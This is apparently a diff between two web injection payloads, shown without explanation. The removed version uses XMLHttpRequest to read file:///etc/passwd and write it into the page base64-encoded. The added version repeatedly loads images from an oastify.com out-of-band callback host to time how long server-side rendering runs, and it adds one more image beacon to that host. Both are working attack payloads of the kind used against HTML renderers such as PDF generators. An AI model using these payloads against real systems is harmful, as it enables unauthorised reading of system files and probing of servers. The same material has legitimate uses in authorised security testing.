@@ -1,5 +1,9 @@
 <script>
-x=new XMLHttpRequest;
-x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///etc/passwd");x.send();
+    let time = 500;
+    setInterval(()=>{
+        let img = document.createElement("img");
+        img.src = `https://817rqqrdu605kau7tpk2tzhi89e02rzfo.oastify.com/ping?time=${time}ms`;
+        time += 500;
+    }, 500);
 </script>
+<img src="https://817rqqrdu605kau7tpk2tzhi89e02rzfo.oastify.com/delay">
